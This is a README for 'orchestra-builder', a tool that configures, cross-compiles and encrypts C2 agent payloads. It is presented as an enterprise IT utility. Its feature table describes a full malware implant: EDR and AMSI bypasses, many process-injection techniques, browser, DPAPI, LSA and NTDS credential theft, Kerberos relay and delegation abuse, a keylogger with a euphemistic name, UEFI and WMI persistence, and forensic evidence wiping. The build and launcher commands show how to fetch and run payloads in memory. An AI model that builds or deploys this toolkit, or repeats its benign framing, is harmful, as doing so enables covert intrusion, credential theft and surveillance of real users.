# Orchestra Builder

`orchestra-builder` is the unified CLI for producing deployable Orchestra
agent payloads. It wraps dependency setup, profile management, cross-compilation,
binary stripping, and AES-256-GCM encryption into a single tool that an
enterprise IT administrator can run end-to-end without learning the rest of the
workspace layout.

```text
orchestra-builder <COMMAND>

Commands:
  setup           Verify host has all required toolchains/packages
  configure       Interactively create a new profile and save it under profiles/
  list-profiles   List all profiles/*.toml entries
  show-profile    Print a single profile's contents
  build           Build the agent for a profile and emit dist/<name>.enc
```

## Install

The builder is a regular workspace crate; build it once with cargo:

```sh
cargo build --release -p builder
# binary lands at target/release/orchestra-builder
```

## 1. Set up your build host

```sh
orchestra-builder setup
# Optionally let it run `rustup target add ...` for missing rust targets:
orchestra-builder setup --auto-install
```

`setup` verifies that the following are present and prints actionable
install hints when anything is missing:

- `cargo` and `rustup`
- A working host C toolchain (`cc` / `cl.exe`) and `pkg-config`
- `mingw-w64` on Linux hosts for Windows GNU builds and Windows headers used
  by the MSVC Zig wrappers
- `zig` on Linux hosts when building checked Darwin, Windows MSVC, or Linux
  ARM64 targets that include C build scripts such as `ring`
- The Rust targets `x86_64-unknown-linux-gnu`, `aarch64-unknown-linux-gnu`,
  `x86_64-pc-windows-gnu`, `aarch64-pc-windows-msvc`,
  `x86_64-apple-darwin`, and `aarch64-apple-darwin`

The builder *never* runs `sudo` automatically. System-package commands are
printed for you to copy-paste; only `rustup target add` is run automatically
(and only with `--auto-install`, after a `y/N` confirmation prompt).

The profile-to-target mapping is currently `windows/x86_64` →
`x86_64-pc-windows-gnu` and `windows/aarch64` →
`aarch64-pc-windows-msvc`. The workspace also checks
`x86_64-pc-windows-msvc`; add that Rust target manually when you need the
MSVC x64 build outside the Builder profile flow.

## 2. Create a profile

```sh
orchestra-builder configure --name windows_stealth
```

This launches an interactive wizard that asks for:

- Target OS (`linux` / `windows` / `macos`) and architecture (`x86_64` /
  `aarch64`) — converted internally to a Rust target triple
- C2 address (`host:port`)
- Encryption key — generate a fresh 32-byte AES key, paste a base64 key, or
  reference a key file via `file:/path/to/key.bin`
- Cargo features to enable on the agent crate when `package = "agent"`
  (multi-select). Recognised
  flags include `persistence`, `network-discovery`, `hci-research`,
  `perf-optimize`, `direct-syscalls`, `manual-map`,
  `traffic-normalization`, `env-validation`, `forward-secrecy`,
  `stack-spoof`, `hot-reload`, and others. Unknown flags are rejected
  before Cargo is invoked. `package = "launcher"` does not accept agent
  feature flags.
- Optional output filename override

The result is written to `profiles/<name>.toml`, for example:

```toml
target_os = "windows"
target_arch = "x86_64"
c2_address = "10.0.0.5:7890"
encryption_key = "aGVsbG8tdGVzdC1rZXktMzItYnl0ZXMtZXhhY3RseSE="
features = []
package = "launcher"
```

The `package` field controls which Cargo crate is built as the deployable
binary. It defaults to `launcher` (in-memory payload delivery); set
`package = "agent"` and `bin_name = "agent-standalone"` together with the
`outbound-c` feature to produce a self-contained agent binary instead.

### Outbound-mode (agent dials the Control Center)

The `outbound-c` feature turns the agent into a binary that automatically
connects to the Orchestra Control Center and reconnects on disconnection.
The Builder bakes the server address and PSK directly into the binary at
compile time so no separate configuration file is required on the endpoint.

When the `configure` wizard detects that you have selected `outbound-c`:

* It prompts for the Control Center pre-shared secret.
* It automatically switches `package` to `"agent"` and `bin_name` to
  `"agent-standalone"`.
* It passes `ORCHESTRA_C_ADDR` and `ORCHESTRA_C_SECRET` as environment
  variables to `cargo build`, where `option_env!()` in the agent source
  captures them at compile time.

Example profile (can be created by the wizard or written by hand):

```toml
target_os               = "linux"
target_arch             = "x86_64"
c2_address              = "10.0.0.5:8444"
encryption_key          = "<base64-32-bytes>"
c_server_secret         = "REPLACE-ME-same-as-agent_shared_secret-in-server-toml"
server_cert_fingerprint = "<64-hex-sha256>"
module_aes_key          = "<base64-32-bytes>"  # required for production builds
features                = ["outbound-c"]
package                 = "agent"
bin_name                = "agent-standalone"
```

The `module_aes_key` field is a base64-encoded 32-byte AES-256 key used to
authenticate loaded modules. It is **required** in any non-debug, non-dev agent
build. If it is missing, the agent exits immediately at startup with:

```
ERROR: module_aes_key is required in production builds.
```

When building via the server's `POST /api/build` API, the `module_aes_key` from
`orchestra-server.toml` is automatically propagated through the build pipeline
(`PayloadConfig` → `ORCHESTRA_MODULE_AES_KEY` env var → `cargo:rustc-env=SYS_MODULE_KEY`
→ `option_env!("SYS_MODULE_KEY")` in the agent). No manual configuration is needed
when using the server API.

Build:

```sh
orchestra-builder build prod-outbound
# -> dist/prod-outbound.enc (AES-encrypted agent-standalone binary)
```

The runtime override env vars (`ORCHESTRA_C` and `ORCHESTRA_SECRET`) take
precedence over the baked-in address/secret. Certificate pinning is baked via
`server_cert_fingerprint` and `ORCHESTRA_C_CERT_FP`.

See [`docs/C_SERVER.md`](../docs/C_SERVER.md) for the full orchestration
picture and the outbound-agent self-verification test.

### Inspect & list profiles

```sh
orchestra-builder list-profiles
orchestra-builder show-profile windows_stealth
```

## 3. Build a payload

```sh
orchestra-builder build windows_stealth
```

The build pipeline:

1. Loads `profiles/windows_stealth.toml` and validates the encryption key.
2. Resolves the Rust target triple from `target_os` / `target_arch`.
3. Runs `cargo build --release --target <triple> -p <package>`, forwarding
  stdout/stderr so you see compiler progress. Agent feature flags are passed
  only when `package = "agent"`; launcher profiles must keep `features = []`.
4. Locates the resulting binary at
   `target/<triple>/release/<package>[.exe]`.
5. Best-effort strip with a target-compatible strip tool. Cross-target
  artifacts are not stripped with the host `strip` binary.
6. Encrypts the binary with AES-256-GCM via HKDF-SHA256 key derivation.
   Wire format: `salt(32) ‖ nonce(12) ‖ ciphertext+tag`.
   HKDF info constant: `b"\x01\x8c\xa3\xf2\x6b\x4d\xe7\x90\x5a\x1f\xbc\xd8\x3e\x72\x09\xaf"`.
7. Writes `dist/<output_name>.enc` (defaults to `dist/<profile_name>.enc`).

## End-to-end verification

```sh
cargo clean
orchestra-builder setup
orchestra-builder configure --name linux_demo   # accept defaults
orchestra-builder build linux_demo
ls -lh dist/                                    # see the .enc
```

The encrypted payload can then be served by `cargo run -p dev-server -- --port 8000`
and consumed by `cargo run -p launcher -- --url http://127.0.0.1:8000/linux_demo.enc --key <base64-key>`.

## Feature flags are discovered at runtime

The interactive `configure` wizard does **not** ship with a hard-coded list
of Cargo feature flags. Instead it reads `agent/Cargo.toml` at the moment
you run it and offers exactly the features the agent crate currently
declares. Adding or removing a `[features]` entry there is reflected in the
wizard with no Builder change required.

If an agent profile saved by an older Builder version refers to a feature that no
longer exists (for example a `[features]` entry that was renamed or
deleted), `orchestra-builder build` rejects the profile before invoking
Cargo. This prevents a build from silently omitting requested behavior.

```sh
$ orchestra-builder build win_lan
Error: profile references feature(s) not declared in agent/Cargo.toml: legacy-something
```

### Self-verification

Run `orchestra-builder configure --name probe` and compare the offered
features against `[features]` in `agent/Cargo.toml`:

```sh
grep -E '^[a-z][a-z0-9-]*\s*=' agent/Cargo.toml \
  | sed -n '/^\[features\]/,/^\[/p' agent/Cargo.toml \
  | grep -oE '^[a-z][a-z0-9-]*' | sort -u
```

The two lists must match. The unit test `read_agent_features_matches_real_cargo_toml`
in `builder/src/config.rs` enforces this contract in CI.

### Feature reference

The table below lists every feature flag declared in `agent/Cargo.toml`.
The `readme_feature_table_matches_agent_features` unit test ensures this
table stays in sync with the crate manifest.

| Feature | Purpose |
|---------|---------|
| `adaptive-timing` | Adaptive C2 timing — Gaussian-distributed callback scheduling modelled on observed network traffic patterns |
| `browser-data` | Browser stored-data recovery — Chrome (including App-Bound Encryption v127+), Edge, and Firefox |
| `callback-inject` | Injection via kernel callback vectors — APC, window message, and timer callback dispatch |
| `cet-bypass` | CET / Shadow Stack bypass for Windows 11 24H2+ hardware-enforced shadow stacks |
| `cfg-bypass` | Control Flow Guard bypass — bitset manipulation, CFG-valid trampolines, dispatch override |
| `com-hijack` | Registry-free COM object hijacking via SxS manifest activation contexts |
| `context-only` | Context-only injection — `SetThreadContext` IP/SP rewrite with restore trampoline; no new remote thread |
| `coop` | Counterfeit Object-Oriented Programming — C++ vtable dispatch chains that pass CFI/CFG checks |
| `delayed-stomp` | Delayed module-stomp injection — waits for EDR initial-scan heuristics to pass before stomping |
| `dev` | Development / debug mode |
| `direct-syscalls` | Direct syscall dispatch via hand-crafted stubs (bypasses ntdll hooks) |
| `doh-transport` | DNS-over-HTTPS covert transport (C2 through DNS TXT queries via DoH resolver); ⚠️ experimental |
| `dpapi-backup` | DPAPI domain backup key retrieval and secret decryption via MS-BKRP |
| `ebpf` | eBPF-based Linux evasion — hides process, files, and network connections from user-space monitoring |
| `embedded_driver` | Embedded encrypted vulnerable-driver payload packaging via `ORCHESTRA_DRIVER_PATH` |
| `entra-ptc` | Entra ID Pass-the-Certificate — OAuth2 client-credentials with RS256 JWT assertion |
| `env-validation` | Environment validation before agent execution |
| `etw-check` | Pre-injection ETW auto-logger enumeration via registry |
| `evanesco` | Continuous memory hiding — per-page RC4 encryption with background re-encryption thread |
| `fiber-inject` | Fiber-based injection — creates remote fiber and schedules it for execution |
| `evasion-transform` | Automated EDR bypass transformation engine — pattern avoidance via instruction substitution |
| `forensic-cleanup` | Forensic cleanup — Windows Prefetch evidence removal and USN journal cleaning |
| `forward-secrecy` | Application-layer perfect forward secrecy via X25519 ECDH + HKDF; ⚠️ HTTP/DoH ECDH is experimental |
| `hci-research` | Human-computer-interaction telemetry — key/mouse events and timing capture |
| `hot-reload` | Hot-reload support — file watcher for dynamic module updates |
| `http-transport` | HTTP malleable-profile transport (C2 over HTTP/S with customizable headers/URIs); ⚠️ experimental |
| `hwbp-amsi` | Hardware-breakpoint AMSI/ETW bypass using DR0/DR1 + VEH |
| `hw-bp-hook` | General-purpose hardware-breakpoint hooking framework (DR0–DR3 + VEH) |
| `kerberos-relay` | Kerberos relay attack via COM cross-session activation — captures service tickets without NTLM |
| `kernel-callback` | Kernel callback overwrite (BYOVD) — surgically overwrite EDR callback pointers to `ret` |
| `lolbin-xwizard` | COM Scriptlet execution via xwizard.exe and alternative LOLBIN dispatchers |
| `lsa-whisperer` | LSA Whisperer — LSA package-interface extraction with Untrusted, SSP inject, and Auto methods |
| `manual-map` | Manual PE mapping injection (implies `module_loader/manual-map`) |
| `module-stomp` | Module stomping — overwrites legitimate DLL in memory with payload |
| `memory-guard` | Encrypt sensitive memory regions while agent is idle (XChaCha20-Poly1305, key in XMM registers) |
| `module-signatures` | Cryptographic module signature verification (implies `common/module-signatures`) |
| `network-discovery` | Network discovery and reconnaissance capabilities |
| `office-addin` | Office add-in persistence via OneDrive sync — fleet-wide persistence through Microsoft sync |
| `outbound-c` | Outbound agent — dials Orchestra Control Center instead of waiting for inbound connections |
| `p2p-tcp` | Peer-to-peer TCP mesh networking |
| `page-fault-exec` | Page-fault driven execution — payload pages encrypted under PAGE_NOACCESS, decrypted on fault |
| `perf-optimize` | Performance optimizations |
| `persistence` | Host persistence capabilities |
| `phantom-dll-hollow` | Phantom DLL hollowing — maps DLL via NtCreateSection, never written to disk |
| `ppid-spoofing` | Parent PID spoofing for process creation |
| `reflective-loader` | Reflective DLL loading via NtCreateSection + NtMapViewOfSection (no VirtualAlloc) |
| `remote-assist` | Remote assistance — screenshot capture, mouse/keyboard control |
| `s4u-abuse` | S4U2Self/S4U2Proxy Kerberos delegation abuse — forges service tickets for arbitrary users |
| `section-map` | Section mapping injection — maps payload via NtCreateSection/NtMapViewOfSection into target |
| `seh-anti-debug` | SEH-based anti-debugging — deeply nested VEH handler chains that crash analysis tools |
| `self-reencode` | Self-re-encoding (Metamorphic Lite) — periodically re-encode .text section at runtime |
| `shadow-credentials` | Shadow Credentials attack — Kerberos authentication via certificate added to target's msDS-KeyCredentialLink |
| `smb-pipe-transport` | SMB/TCP named-pipe covert transport (direct named-pipe or TCP relay mode); ⚠️ experimental |
| `ssh-transport` | SSH covert transport — tunnels C2 traffic through an SSH session channel; ⚠️ experimental |
| `stack-spoof` | Stack spoofing during indirect syscall dispatch (implies `direct-syscalls`) |
| `stealth` | Stealth bundle — enables `direct-syscalls`, `unsafe-runtime-rewrite`, `memory-guard`, `ppid-spoofing` |
| `surveillance` | Surveillance — screenshot capture, keylogger, clipboard monitoring |
| `syscall-emulation` | Routes Nt* syscalls through kernel32/advapi32 equivalents (implies `direct-syscalls`) |
| `thread-ctx-encrypt` | Thread context encryption — encrypts CONTEXT structs, stack pointers, and TLS during sleep |
| `thread-hijack` | Thread hijacking — suspends existing thread and redirects execution to payload |
| `threadpool-inject` | Threadpool injection — queues payload via TP_WORK/TP_TIMER/TP_WAIT to hijack system threadpool |
| `token-impersonation` | Token-only impersonation via NtImpersonateThread / SetThreadToken (implies `direct-syscalls`) |
| `traffic-normalization` | Traffic normalization — shapes C2 traffic to blend with legitimate patterns |
| `trampoline-spoof` | Trampoline-based multi-frame stack spoofing through legitimate DLL gadgets (implies `direct-syscalls`) |
| `transacted-hollowing` | NTFS transaction-based process hollowing — file on disk never existed (implies `direct-syscalls`) |
| `uefi-persistence` | UEFI firmware-level persistence — NVRAM manipulation, ESP driver deployment, capsule delivery |
| `unsafe-runtime-rewrite` | Unsafe runtime .text section rewriting (implies `optimizer/unsafe-runtime-rewrite`) |
| `vss-pivot` | VSS shadow copy pivoting — reads locked SAM/NTDS through shadow copy paths, bypasses file telemetry |
| `wmi-persistence` | WMI permanent event subscriptions with encrypted cloud payloads |
| `write-raid-amsi` | AMSI Write-Raid bypass — race thread overwrites AmsiInitFailed flag, no code patching |
| `wsl2-evasion` | WSL2 evasion layer — executes ELF binaries and relays C2 through WSL2 VM |
